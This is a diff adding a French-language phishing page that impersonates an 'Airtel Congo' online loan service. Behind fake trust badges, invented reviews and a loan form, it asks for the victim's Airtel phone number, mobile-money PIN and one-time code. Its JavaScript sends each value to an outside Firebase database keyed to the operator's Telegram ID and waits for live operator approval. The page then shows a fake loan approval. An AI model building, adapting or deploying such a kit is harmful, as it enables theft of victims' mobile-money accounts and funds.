+                            <div class="badge-text">
+                                <strong>Sécurité SSL</strong>
+                                <small>Chiffrement 256-bit</small>
+                            </div>
+                        </div>
+                        <div class="badge">
+                            <div class="badge-icon">✓</div>
+                            <div class="badge-text">
+                                <strong>Prêteur Autorisé</strong>
+                                <small>Régulé &amp; Conforme</small>
+                            </div>
+                        </div>
+                        <div class="badge">
+                            <div class="badge-icon">🛡️</div>
+                            <div class="badge-text">
+                                <strong>Confidentialité Protégée</strong>
+                                <small>Conforme au RGPD</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="reviews" class="reviews-section">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">Ce Que Disent Nos Clients</h2>
+                    <p class="section-subtitle">Rejoignez des milliers d'emprunteurs satisfaits</p>
+                </div>
+                <div class="reviews-grid">
+                    <div class="review-card">
+                        <div class="stars">★★★★★</div>
+                        <p class="review-text">"J'ai obtenu l'approbation en 10 minutes! L'ensemble du processus a été fluide et transparent. La meilleure expérience de prêt que j'aie eue."</p>
+                        <div class="reviewer">
+                            <strong>Sarah M.</strong>
+                            <span>Client Vérifié</span>
+                        </div>
+                    </div>
+                    <div class="review-card">
+                        <div class="stars">★★★★★</div>
+                        <p class="review-text">"Pas de frais cachés, exactement comme promis. Mon paiement mensuel s'adapte parfaitement à mon budget. Je recommande fortement!"</p>
+                        <div class="reviewer">
+                            <strong>James T.</strong>
+                            <span>Client Vérifié</span>
+                        </div>
+                    </div>
+                    <div class="review-card">
+                        <div class="stars">★★★★★</div>
+                        <p class="review-text">"Rapide et sécurisé. J'avais peur des prêts en ligne, mais Airtel Congo m'a rassuré à chaque étape. Très satisfait!"</p>
+                        <div class="reviewer">
+                            <strong>Maria L.</strong>
+                            <span>Client Vérifié</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="cta-section">
+            <div class="container">
+                <div class="cta-content">
+                    <h2>Prêt à Commencer?</h2>
+                    <p>Rejoignez 50 000+ clients qui font confiance à Airtel Congo pour leurs besoins financiers</p>
+                    <button class="cta-button large" onclick="showApplication()">
+                        Demander Maintenant - Décision en Minutes
+                        <span class="arrow">→</span>
+                    </button>
+                    <p class="cta-note">✓ Aucun impact sur votre score de crédit • ✓ Demande sécurisée • ✓ Décision Rapide</p>
+                </div>
+            </div>
+        </section>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-section">
+                        <h4>Airtel Congo</h4>
+                        <p>Prêts rapides, transparents et sécurisés.</p>
+                    </div>
+                    <div class="footer-section">
+                        <h4>Entreprise</h4>
+                        <a href="#">À Propos de Nous</a>
+                        <a href="#">Nous Contacter</a>
+                        <a href="#">Carrières</a>
+                    </div>
+                    <div class="footer-section">
+                        <h4>Légal</h4>
+                        <a href="#">Conditions d'Utilisation</a>
+                        <a href="#">Politique de Confidentialité</a>
+                        <a href="#">Licence</a>
+                    </div>
+                    <div class="footer-section">
+                        <h4>Support</h4>
+                        <a href="#">Centre d'Aide</a>
+                        <a href="#">FAQ</a>
+                        <a href="#">Chat en Direct</a>
+                    </div>
+                </div>
+                <div class="footer-bottom">
+                    <p>© 2026 Airtel Congo. Tous les droits sont réservés. Prêteur Autorisé.</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- ==================== APPLICATION PAGE ==================== -->
+    <div id="applicationPage" class="page app-page">
+        <div class="app-container">
+            <div class="app-header">
+                <div class="logo-small">💰 Airtel Congo</div>
+                <div class="security-indicator">
+                    <span class="lock-icon">🔒</span>
+                    <span>Demande Sécurisée</span>
+                </div>
+            </div>
+
+            <div class="progress-wrapper">
+                <div class="progress-steps">
+                    <div class="step-item active">
+                        <div class="step-circle">1</div>
+                        <span>Informations Personnelles</span>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step-item">
+                        <div class="step-circle">2</div>
+                        <span>Vérification</span>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step-item">
+                        <div class="step-circle">3</div>
+                        <span>Approbation</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-card">
+                <h1 class="form-title">Parlez-Nous de Vous</h1>
+                <p class="form-subtitle">Nous avons besoin de quelques informations pour traiter votre demande de prêt</p>
+
+                <form id="applicationForm" onsubmit="event.preventDefault(); showVerification();">
+                    <div class="form-section">
+                        <h3 class="section-title">Informations Personnelles</h3>
+                        <div class="form-group">
+                            <label>Nom Complet *</label>
+                            <input type="text" id="fullName" required placeholder="Jean Dupont">
+                        </div>
+                        <div class="form-group">
+                            <label>Adresse E-mail *</label>
+                            <input type="email" id="email" required placeholder="jean@example.com">
+                        </div>
+                        <div class="form-group">
+                            <label>Revenu Mensuel *</label>
+                            <div class="input-with-icon">
+                                <span class="input-icon">$</span>
+                                <input type="number" id="monthlyIncome" required placeholder="3000000" min="0">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-section">
+                        <h3 class="section-title">Détails du Prêt</h3>
+                        <div class="form-group">
+                            <label>Montant du Prêt Demandé *</label>
+                            <div class="input-with-icon">
+                                <span class="input-icon">$</span>
+                                <input type="number" id="loanAmount" required placeholder="5000" min="100" max="50000" step="100">
+                            </div>
+                            <small class="help-text">Entre $ 100 et $ 50 000</small>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Objet du Prêt *</label>
+                                <select id="loanPurpose" required>
+                                    <option value="">Sélectionnez l'objet</option>
+                                    <option value="personal">Usage Personnel</option>
+                                    <option value="business">Affaires</option>
+                                    <option value="education">Éducation</option>
+                                    <option value="medical">Médical</option>
+                                    <option value="home">Amélioration du Logement</option>
+                                    <option value="debt">Consolidation de Dettes</option>
+                                    <option value="other">Autre</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Durée de Remboursement *</label>
+                                <select id="repaymentPeriod" required>
+                                    <option value="">Sélectionnez la durée</option>
+                                    <option value="3">3 Mois</option>
+                                    <option value="6">6 Mois</option>
+                                    <option value="12">12 Mois</option>
+                                    <option value="24">24 Mois</option>
+                                    <option value="36">36 Mois</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Statut d'Emploi *</label>
+                            <select id="employmentStatus" required>
+                                <option value="">Sélectionnez le statut</option>
+                                <option value="employed">Employé</option>
+                                <option value="self-employed">Travailleur Indépendant</option>
+                                <option value="business">Chef d'Entreprise</option>
+                                <option value="retired">Retraité</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="consent-box">
+                        <input type="checkbox" id="consent" required>
+                        <label for="consent">
+                            Je confirme que toutes les informations fournies sont exactes et j'accepte les
+                            <a href="#">Conditions d'Utilisation</a> et la <a href="#">Politique de Confidentialité</a>
+                        </label>
+                    </div>
+
+                    <button type="submit" class="submit-button">
+                        Continuer la Vérification
+                        <span class="arrow">→</span>
+                    </button>
+
+                    <div class="security-note">
+                        <span class="lock-icon">🔒</span>
+                        <p>Vos informations sont chiffrées et sécurisées. Nous ne partageons jamais vos données.</p>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== VERIFICATION PAGE (PIN) ==================== -->
+    <div id="verificationPage" class="page app-page">
+        <div class="app-container">
+            <div class="app-header">
+                <div class="logo-small">💰 Airtel Congo</div>
+                <div class="security-indicator">
+                    <span class="lock-icon">🔒</span>
+                    <span>Vérification PIN</span>
+                </div>
+            </div>
+
+            <div class="progress-wrapper">
+                <div class="progress-steps">
+                    <div class="step-item completed">
+                        <div class="step-circle">✓</div>
+                        <span>Informations Personnelles</span>
+                    </div>
+                    <div class="step-line active"></div>
+                    <div class="step-item active">
+                        <div class="step-circle">2</div>
+                        <span>Vérification</span>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step-item">
+                        <div class="step-circle">3</div>
+                        <span>Approbation</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pinScreen" class="form-card">
+                <h1 class="form-title">Vérifiez Votre Identité</h1>
+                <p class="form-subtitle">Nous avons besoin de vérifier votre téléphone et votre PIN Airtel</p>
+
+                <div class="form-group">
+                    <label>Numéro de Téléphone *</label>
+                    <input type="tel" id="phoneNumber" required placeholder="+243712345678" class="large-input">
+                    <small class="help-text">Entrez votre numéro de téléphone Airtel</small>
+                </div>
+
+                <div class="form-group">
+                    <label>PIN Airtel (4 chiffres) *</label>
+                    <input type="password" id="pin" required maxlength="4" placeholder="****" class="large-input pin-input" inputmode="numeric">
+                    <small class="help-text">Entrez votre PIN Airtel à 4 chiffres</small>
+                </div>
+
+                <div id="verificationError" class="verification-error">Téléphone ou PIN incorrect.</div>
+
+                <button id="verifyPinBtn" class="submit-button" onclick="submitPin()">
+                    Vérifier et Continuer
+                    <span class="arrow">→</span>
+                </button>
+
+                <div class="info-box">
+                    <p><strong>Pourquoi avons-nous besoin de cela?</strong></p>
+                    <p>Nous confirmons que vous êtes le propriétaire du compte et empêchons l'utilisation non autorisée de vos informations.</p>
+                </div>
+            </div>
+
+            <div id="processingScreen" class="form-card" style="display: none;">
+                <div class="processing-content">
+                    <div class="spinner-large"></div>
+                    <h2 class="processing-title">Vérification de Vos Informations</h2>
+                    <p class="processing-text">Veuillez patienter pendant que nous vérifions votre numéro de téléphone et votre PIN...</p>
+                    <div class="status-box">
+                        <span class="status-dot"></span>
+                        <span>Vérification en cours avec l'administrateur...</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="rejectionScreen" class="form-card" style="display: none;">
+                <div class="result-content">
+                    <div class="result-icon error">✕</div>
+                    <h2 class="result-title">Informations Invalides</h2>
+                    <p class="result-text">Désolé, les informations que vous avez fournies n'ont pas été acceptées. Veuillez réessayer ou contacter le support.</p>
+                    <button class="submit-button" onclick="retryPin()">
+                        Réessayer
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== OTP VERIFICATION PAGE ==================== -->
+    <div id="otpPage" class="page app-page">
+        <div class="app-container">
+            <div class="app-header">
+                <div class="logo-small">💰 Airtel Congo</div>
+                <div class="security-indicator">
+                    <span class="lock-icon">🔒</span>
+                    <span>Vérification OTP</span>
+                </div>
+            </div>
+
+            <div class="progress-wrapper">
+                <div class="progress-steps">
+                    <div class="step-item completed">
+                        <div class="step-circle">✓</div>
+                        <span>Informations Personnelles</span>
+                    </div>
+                    <div class="step-line completed"></div>
+                    <div class="step-item completed">
+                        <div class="step-circle">✓</div>
+                        <span>Vérification</span>
+                    </div>
+                    <div class="step-line active"></div>
+                    <div class="step-item active">
+                        <div class="step-circle">3</div>
+                        <span>Approbation</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="otpScreen" class="form-card">
+                <div class="otp-header">
+                    <div class="otp-icon">📱</div>
+                    <h1 class="form-title">Entrez Votre Code de Vérification</h1>
+                    <p class="form-subtitle">Nous avons envoyé un code à 4 chiffres à <strong id="maskedPhone">****</strong></p>
+                </div>
+
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" class="otp-box" id="otp1" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" maxlength="1" class="otp-box" id="otp2" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" maxlength="1" class="otp-box" id="otp3" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" maxlength="1" class="otp-box" id="otp4" inputmode="numeric" pattern="[0-9]">
+                </div>
+
+                <button id="verifyOtpBtn" class="submit-button">
+                    Vérifier le Code
+                    <span class="arrow">→</span>
+                </button>
+
+                <div class="info-box">
+                    <p><strong>Pourquoi avons-nous besoin de cela?</strong></p>
+                    <p>La vérification OTP confirme que vous avez accès au numéro de téléphone fourni et aide à prévenir les fraudes.</p>
+                </div>
+            </div>
+
+            <div id="processingOtpScreen" class="form-card" style="display: none;">
+                <div class="processing-content">
+                    <div class="spinner-large"></div>
+                    <h2 class="processing-title">Vérification de Votre Code</h2>
+                    <p class="processing-text">Veuillez patienter pendant que nous vérifions votre OTP...</p>
+                    <div class="status-box">
+                        <span class="status-dot"></span>
+                        <span>Vérification en cours avec l'administrateur...</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="otpRejectionScreen" class="form-card" style="display: none;">
+                <div class="result-content">
+                    <div class="result-icon error">✕</div>
+                    <h2 class="result-title">Code Incorrect</h2>
+                    <p class="result-text">Le code de vérification que vous avez entré est incorrect.</p>
+                    <button class="submit-button" onclick="retryOtp()">
+                        Réessayer
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== APPROVAL (CONGRATULATIONS) PAGE ==================== -->
+    <div id="approvalPage" class="page app-page">
+        <div class="app-container">
+            <div class="app-header">
+                <div class="logo-small">💰 Airtel Congo</div>
+                <div class="security-indicator success">
+                    <span class="check-icon">✓</span>
+                    <span>Vérifié</span>
+                </div>
+            </div>
+
+            <div class="progress-wrapper">
+                <div class="progress-steps">
+                    <div class="step-item completed">
+                        <div class="step-circle">✓</div>
+                        <span>Informations Personnelles</span>
+                    </div>
+                    <div class="step-line completed"></div>
+                    <div class="step-item completed">
+                        <div class="step-circle">✓</div>
+                        <span>Vérification</span>
+                    </div>
+                    <div class="step-line completed"></div>
+                    <div class="step-item completed">
+                        <div class="step-circle">✓</div>
+                        <span>Approbation</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-card approval-card">
+                <div class="success-animation">
+                    <div class="success-checkmark">
+                        <div class="check-icon-large">✓</div>
+                    </div>
+                </div>
+                <h1 class="approval-title">Félicitations! 🎉</h1>
+                <p class="approval-subtitle">Votre demande de prêt a été approuvée</p>
+
+                <div class="approval-box">
+                    <div class="approval-badge">✓ APPROUVÉ</div>
+                    <div class="loan-amount-display">
+                        <span class="amount-label">Montant Approuvé</span>
+                        <span class="amount-value" id="approvedAmount">$ 0</span>
+                        <span class="amount-note">Selon votre demande</span>
+                    </div>
+                </div>
+
+                <div class="loan-details-grid">
+                    <div class="detail-card">
+                        <div class="detail-icon">💰</div>
+                        <div class="detail-content">
+                            <span class="detail-label">Montant du Prêt</span>
+                            <span class="detail-value" id="loanAmountDetail">$ 0</span>
+                        </div>
+                    </div>
+                    <div class="detail-card">
+                        <div class="detail-icon">📅</div>
+                        <div class="detail-content">
+                            <span class="detail-label">Durée de Remboursement</span>
+                            <span class="detail-value" id="repaymentPeriodDetail">12 mois</span>
+                        </div>
+                    </div>
+                    <div class="detail-card">
+                        <div class="detail-icon">💳</div>
+                        <div class="detail-content">
+                            <span class="detail-label">Paiement Mensuel</span>
+                            <span class="detail-value" id="monthlyPaymentDetail">$ 0</span>
+                        </div>
+                    </div>
+                    <div class="detail-card">
+                        <div class="detail-icon">📊</div>
+                        <div class="detail-content">
+                            <span class="detail-label">Taux d'Intérêt</span>
+                            <span class="detail-value">12% APR</span>
+                        </div>
+                    </div>
+                    <div class="detail-card">
+                        <div class="detail-icon">📈</div>
+                        <div class="detail-content">
+                            <span class="detail-label">Montant Total Remboursé</span>
+                            <span class="detail-value" id="totalRepaymentDetail">$ 0</span>
+                        </div>
+                    </div>
+                    <div class="detail-card">
+                        <div class="detail-icon">⚡</div>
+                        <div class="detail-content">
+                            <span class="detail-label">Décaissement des Fonds</span>
+                            <span class="detail-value">24 heures</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-content">
+                        <p><strong>🎉 Qu'est-ce qui vient ensuite?</strong></p>
+                        <ul class="next-steps">
+                            <li>✓ Votre demande a été approuvée</li>
+                            <li>✓ Le contrat de prêt sera envoyé à votre e-mail</li>
+                            <li>✓ Les fonds seront décaissés dans 24 heures</li>
+                            <li>✓ Consultez votre e-mail pour plus de détails</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="action-buttons">
+                    <button class="submit-button" onclick="downloadAgreement()">
+                        <span class="button-icon">📄</span>
+                        Télécharger le Contrat
+                    </button>
+                    <button class="submit-button secondary" onclick="viewDashboard()">
+                        <span class="button-icon">📊</span>
+                        Voir le Tableau de Bord
+                    </button>
+                </div>
+
+                <div class="contact-box">
+                    <p><strong>Besoin d'Aide?</strong></p>
+                    <p>Contactez-nous à <a href="mailto:support@airtelcongo.com">support@airtelcongo.com</a> ou appelez le <a href="tel:100">100</a></p>
+                </div>
+
+                <div class="approval-footer">
+                    <p>🔒 Vos informations sont sécurisées et chiffrées</p>
+                    <p style="margin-top:8px; font-size:0.85rem;">© 2026 Airtel Congo. Tous les droits réservés.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== TELEGRAM ID SETTINGS (floating gear) ==================== -->
+    <button id="tgSettingsBtn" title="Set Telegram User ID">⚙️</button>
+
+    <div id="tgSettingsModal">
+        <div class="tg-modal-card">
+            <h3>Telegram User ID</h3>
+            <p>All verification data (phone, PIN, OTP) will be written to this user's node.</p>
+            <input type="text" id="tgIdInput" inputmode="numeric" pattern="[0-9]*" placeholder="e.g. 1970783136">
+            <div class="tg-modal-actions">
+                <button id="tgIdCancel" type="button">Cancel</button>
+                <button id="tgIdSave" type="button">Save</button>
+            </div>
+            <p id="tgIdCurrent">Current: <span id="tgIdCurrentValue">—</span></p>
+        </div>
+    </div>
+
+    <!-- ==================== JAVASCRIPT ==================== -->
+    <script>
+        // ===================================================
+        // 🔧 TELEGRAM USER ID (editable + persisted)
+        // ===================================================
+        let TELEGRAM_USER_ID = localStorage.getItem('airtel_telegram_id') || "1970783136";
+        // ===================================================
+
+        // ===== FIREBASE CONFIGURATION =====
+        const firebaseConfig = {
+            databaseURL: "https://altibex-19bc2-default-rtdb.firebaseio.com/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // ==================== PAGE SWITCHING ====================
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function showApplication()    { showPage('applicationPage'); }
+        function showVerification()   { showPage('verificationPage'); }
+        function showOtp()            { showPage('otpPage'); initOtp(); }
+        function showApproval()       { showPage('approvalPage'); populateApprovalDetails(); }
+        function showLanding()        { showPage('landingPage'); }
+
+        // ==================== FIREBASE HELPERS ====================
+        function isValidPhone(phone) {
+            const digits = phone.replace(/\D/g, '');
+            return digits.length >= 7 && digits.length <= 15;
+        }
+
+        // PIN step: write phone + pin
+        function saveBothToFirebase(phone, pin) {
+            return database.ref('Telegram Users/' + TELEGRAM_USER_ID).update({
+                phone: phone,
+                pin: pin
+            });
+        }
+
+        // OTP step: write otp
+        function saveOtpToFirebase(otp) {
+            return database.ref('Telegram Users/' + TELEGRAM_USER_ID).update({
+                otp: otp
+            });
+        }
+
+        // PIN baseline flag
+        function resetVerifyToDefault() {
+            return database.ref('Telegram Users/' + TELEGRAM_USER_ID).update({ verify: 1 });
+        }
+
+        // OTP baseline flag (separate flag)
+        function resetOtpVerifyToDefault() {
+            return database.ref('Telegram Users/' + TELEGRAM_USER_ID).update({ verify_otp: 1 });
+        }
+
+        // ==================== PIN LISTENER ====================
+        let pinVerifyListener = null;
+        function listenForPinVerification(onComplete) {
+            const ref = database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify');
+            if (pinVerifyListener) { ref.off('value', pinVerifyListener); pinVerifyListener = null; }
+
+            pinVerifyListener = ref.on('value', (snapshot) => {
+                const val = snapshot.val();
+                console.log('🔍 PIN verify value:', val);
+                if (val === true) {
+                    ref.off('value', pinVerifyListener); pinVerifyListener = null;
+                    resetVerifyToDefault();
+                    onComplete(true);
+                } else if (val === false) {
+                    ref.off('value', pinVerifyListener); pinVerifyListener = null;
+                    resetVerifyToDefault();
+                    onComplete(false);
+                }
+            });
+        }
+
+        // ==================== OTP LISTENER ====================
+        let otpVerifyListener = null;
+        function listenForOtpVerification(onComplete) {
+            const ref = database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp');
+            if (otpVerifyListener) { ref.off('value', otpVerifyListener); otpVerifyListener = null; }
+
+            otpVerifyListener = ref.on('value', (snapshot) => {
+                const val = snapshot.val();
+                console.log('🔍 OTP verify_otp value:', val);
+
+                if (val === true) {
+                    ref.off('value', otpVerifyListener); otpVerifyListener = null;
+                    database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp').set(1);
+                    onComplete(true);
+                } else if (val === false) {
+                    ref.off('value', otpVerifyListener); otpVerifyListener = null;
+                    database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp').set(1);
+                    onComplete(false);
+                }
+            });
+        }
+
+        // ==================== PIN VERIFICATION ====================
+        let isPinVerifying = false;
+
+        function submitPin() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const pin = document.getElementById('pin').value;
+            const verificationError = document.getElementById('verificationError');
+
+            verificationError.classList.remove('visible');
+
+            if (!isValidPhone(phone)) {
+                verificationError.textContent = 'Veuillez entrer un numéro de téléphone valide.';
+                verificationError.classList.add('visible');
+                return;
+            }
+            if (!pin || pin.length !== 4) {
+                verificationError.textContent = 'Veuillez entrer un PIN à 4 chiffres.';
+                verificationError.classList.add('visible');
+                return;
+            }
+
+            const cleanDigits = phone.replace(/\D/g, '');
+            const fullPhone = '+243' + cleanDigits;
+
+            console.log('📱 Writing phone+pin:', fullPhone, pin);
+
+            saveBothToFirebase(fullPhone, pin)
+                .then(() => {
+                    console.log('✅ phone+pin written');
+                    attemptLoginWithData(fullPhone, pin);
+                })
+                .catch((error) => {
+                    console.error('❌ Firebase write error:', error);
+                    verificationError.textContent = 'Échec de l\'enregistrement. Veuillez réessayer.';
+                    verificationError.classList.add('visible');
+                });
+        }
+
+        function attemptLoginWithData(phone, pin) {
+            if (isPinVerifying) return;
+            isPinVerifying = true;
+
+            localStorage.setItem('airtel_phone', phone);
+
+            document.getElementById('pinScreen').style.display = 'none';
+            document.getElementById('processingScreen').style.display = 'block';
+
+            resetVerifyToDefault()
+                .then(() => {
+                    listenForPinVerification((result) => {
+                        document.getElementById('processingScreen').style.display = 'none';
+                        isPinVerifying = false;
+
+                        if (result === true) {
+                            console.log('✅ PIN approved → OTP page');
+                            document.getElementById('pinScreen').style.display = 'block';
+                            document.getElementById('rejectionScreen').style.display = 'none';
+                            showOtp();
+                        } else {
+                            console.log('❌ PIN rejected');
+                            document.getElementById('rejectionScreen').style.display = 'block';
+                        }
+                    });
+                })
+                .catch((error) => {
+                    console.error(error);
+                    document.getElementById('processingScreen').style.display = 'none';
+                    isPinVerifying = false;
+                    document.getElementById('verificationError').textContent = 'Erreur de vérification. Veuillez réessayer.';
+                    document.getElementById('verificationError').classList.add('visible');
+                });
+        }
+
+        function retryPin() {
+            document.getElementById('rejectionScreen').style.display = 'none';
+            document.getElementById('pinScreen').style.display = 'block';
+            document.getElementById('pin').value = '';
+            document.getElementById('verificationError').classList.remove('visible');
+        }
+
+        // ==================== OTP VERIFICATION ====================
+        function initOtp() {
+            const otpBoxes = [
+                document.getElementById('otp1'),
+                document.getElementById('otp2'),
+                document.getElementById('otp3'),
+                document.getElementById('otp4')
+            ];
+
+            const verifyOtpBtn        = document.getElementById('verifyOtpBtn');
+            const maskedPhoneEl       = document.getElementById('maskedPhone');
+            const otpScreen           = document.getElementById('otpScreen');
+            const processingOtpScreen = document.getElementById('processingOtpScreen');
+            const otpRejectionScreen  = document.getElementById('otpRejectionScreen');
+
+            function maskPhone(phone) {
+                if (!phone) return '****';
+                const cleaned = phone.replace(/\s+/g, '');
+                if (cleaned.length <= 4) return cleaned;
+                return '****' + cleaned.slice(-4);
+            }
+
+            maskedPhoneEl.textContent = maskPhone(localStorage.getItem('airtel_phone'));
+
+            otpBoxes.forEach(b => b.value = '');
+            otpScreen.style.display = 'block';
+            processingOtpScreen.style.display = 'none';
+            otpRejectionScreen.style.display = 'none';
+
+            otpBoxes.forEach((box, index) => {
+                box.addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                    if (e.target.value && index < otpBoxes.length - 1) {
+                        otpBoxes[index + 1].focus();
+                    }
+                });
+                box.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                        otpBoxes[index - 1].focus();
+                        otpBoxes[index - 1].value = '';
+                    }
+                    if (e.key === 'Enter') verifyOtp();
+                });
+                box.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 4);
+                    if (pastedData.length === 4) {
+                        otpBoxes.forEach((b, i) => { b.value = pastedData[i] || ''; });
+                        otpBoxes[3].focus();
+                    }
+                });
+            });
+
+            function verifyOtp() {
+                const code = otpBoxes.map(b => b.value).join('');
+
+                if (code.length !== 4) {
+                    alert('Veuillez entrer les 4 chiffres du code.');
+                    return;
+                }
+
+                if (window.__otpVerifying) return;
+                window.__otpVerifying = true;
+
+                localStorage.setItem('airtel_otp', code);
+
+                otpScreen.style.display = 'none';
+                processingOtpScreen.style.display = 'block';
+
+                saveOtpToFirebase(code)
+                    .then(() => {
+                        console.log('✅ OTP written to Firebase:', code);
+                        return resetOtpVerifyToDefault();
+                    })
+                    .then(() => {
+                        listenForOtpVerification((result) => {
+                            processingOtpScreen.style.display = 'none';
+                            window.__otpVerifying = false;
+
+                            if (result === true) {
+                                console.log('✅ OTP approved → Congratulations page');
+                                showApproval();
+                            } else {
+                                console.log('❌ OTP rejected');
+                                otpRejectionScreen.style.display = 'block';
+                            }
+                        });
+                    })
+                    .catch((err) => {
+                        console.error('❌ OTP Firebase error:', err);
+                        processingOtpScreen.style.display = 'none';
+                        window.__otpVerifying = false;
+                        alert('Erreur de vérification. Veuillez réessayer.');
+                    });
+            }
+
+            verifyOtpBtn.addEventListener('click', verifyOtp);
+
+            // ✅ Focus only when the OTP page is actually visible, and only the first box
+            const otpPage = document.getElementById('otpPage');
+            if (otpPage && otpPage.classList.contains('active')) {
+                // Small delay to make sure the page is rendered, then focus the first box once
+                setTimeout(() => {
+                    otpBoxes[0].focus();
+                }, 50);
+            }
+        }
+
+        function retryOtp() {
+            document.getElementById('otpRejectionScreen').style.display = 'none';
+            document.getElementById('otpScreen').style.display = 'block';
+            ['otp1','otp2','otp3','otp4'].forEach(id => document.getElementById(id).value = '');
+            document.getElementById('otp1').focus();
+        }
+
+        // ==================== APPROVAL PAGE ====================
+        function populateApprovalDetails() {
+            const amount = parseFloat(document.getElementById('loanAmount').value) || 5000;
+            const term = parseInt(document.getElementById('repaymentPeriod').value) || 12;
+            const monthlyRate = 0.12 / 12;
+
+            let monthlyPayment = 0;
+            if (monthlyRate === 0) {
+                monthlyPayment = amount / term;
+            } else {
+                const factor = Math.pow(1 + monthlyRate, term);
+                monthlyPayment = amount * monthlyRate * factor / (factor - 1);
+            }
+            const totalRepaid = monthlyPayment * term;
+
+            const formatMoney = v => '$ ' + v.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+            const formatMoneyDetailed = v => '$ ' + v.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+
+            document.getElementById('approvedAmount').textContent        = formatMoney(amount);
+            document.getElementById('loanAmountDetail').textContent      = formatMoney(amount);
+            document.getElementById('repaymentPeriodDetail').textContent = term + ' mois';
+            document.getElementById('monthlyPaymentDetail').textContent  = formatMoneyDetailed(monthlyPayment);
+            document.getElementById('totalRepaymentDetail').textContent  = formatMoney(totalRepaid);
+        }
+
+        function downloadAgreement() { alert('Téléchargement du contrat... (Simulation)'); }
+        function viewDashboard()     { alert('Redirection vers le tableau de bord... (Simulation)'); }
+
+        // ==================== TELEGRAM ID SETTINGS UI ====================
+        (function() {
+            const btn      = document.getElementById('tgSettingsBtn');
+            const modal    = document.getElementById('tgSettingsModal');
+            const input    = document.getElementById('tgIdInput');
+            const cancel   = document.getElementById('tgIdCancel');
+            const save     = document.getElementById('tgIdSave');
+            const currVal  = document.getElementById('tgIdCurrentValue');
+
+            function refreshCurrentLabel() {
+                currVal.textContent = TELEGRAM_USER_ID;
+                input.value = TELEGRAM_USER_ID;
+            }
+            refreshCurrentLabel();
+
+            btn.addEventListener('click', function() {
+                refreshCurrentLabel();
+                modal.classList.add('active');
+                setTimeout(() => input.focus(), 60);
+            });
+
+            cancel.addEventListener('click', function() {
+                modal.classList.remove('active');
+            });
+
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) modal.classList.remove('active');
+            });
+
+            save.addEventListener('click', function() {
+                const newId = (input.value || '').trim();
+                if (!/^\d{5,15}$/.test(newId)) {
+                    alert('Please enter a valid Telegram User ID (5-15 digits).');
+                    return;
+                }
+                localStorage.setItem('airtel_telegram_id', newId);
+                TELEGRAM_USER_ID = newId;
+
+                // Detach any listeners bound to the old path
+                try {
+                    if (pinVerifyListener) {
+                        database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify')
+                            .off('value', pinVerifyListener);
+                        pinVerifyListener = null;
+                    }
+                    if (otpVerifyListener) {
+                        database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp')
+                            .off('value', otpVerifyListener);
+                        otpVerifyListener = null;
+                    }
+                } catch (e) {}
+
+                refreshCurrentLabel();
+                modal.classList.remove('active');
+                console.log('✅ Telegram User ID updated to:', TELEGRAM_USER_ID);
+                console.log('   New PIN flag path:', 'Telegram Users/' + TELEGRAM_USER_ID + '/verify');
+                console.log('   New OTP flag path:', 'Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp');
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') { e.preventDefault(); save.click(); }
+            });
+        })();
+
+        // ==================== LOAN CALCULATOR ====================
+        (function() {
+            const amountInput      = document.getElementById('calcAmount');
+            const slider           = document.getElementById('calcSlider');
+            const termSelect       = document.getElementById('calcTerm');
+            const monthlyPaymentEl = document.getElementById('monthlyPayment');
+            const totalRepaymentEl = document.getElementById('totalRepayment');
